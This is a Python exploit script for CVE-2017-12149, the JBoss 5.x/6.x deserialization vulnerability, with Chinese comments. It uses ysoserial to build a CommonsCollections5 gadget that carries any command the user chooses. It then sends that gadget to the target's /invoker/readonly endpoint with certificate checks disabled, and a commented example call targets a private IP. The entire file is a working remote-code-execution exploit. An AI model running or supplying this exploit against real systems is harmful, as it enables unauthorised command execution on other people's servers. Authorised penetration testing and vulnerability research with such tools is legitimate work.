#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/12 19:51
# Author     : yunkong
# FileName   : cve_2017_12149_cmd.py
# Description:
#
# Exploit Title: JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）
# Version: JBoss 5.x/6.x
# CVE: CVE-2017-12149

import requests
import urllib3
import os
from subprocess import check_output

urllib3.disable_warnings()  # 忽略https证书告警

YSOSERIAL_DEFAULT_PATHS = ['../../../public_lib/ysoserial.jar']


def exploit(url, command, ysoserial_path=None):
    # 解析URL获取目标IP和端口号
    protocol, rest = url.split("://")
    ip, port = rest.split(":")
    port = int(port)

    if not ysoserial_path:
        for path in YSOSERIAL_DEFAULT_PATHS:
            if os.path.exists(path):
                ysoserial_path = path

    if ysoserial_path is None:
        print('[-] Could not find ysoserial JAR file')
        return False

    if not command:
        print('[-] You must specify a command to run')
        return False

    gadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections5', command])

    r = requests.post('{}://{}:{}/invoker/readonly'.format(protocol, ip, port), verify=False, data=gadget)

    if r.status_code == 500:
        print('[+] Command executed successfully')
        return True
    else:
        print('[-] Failed to execute command')
        return False


def vuln_exploit_start(target_url, command):
    exploit(target_url, command, ysoserial_path=None)


# vuln_exploit_start('http://192.168.12.130:8080', 'touch /tmp/test')
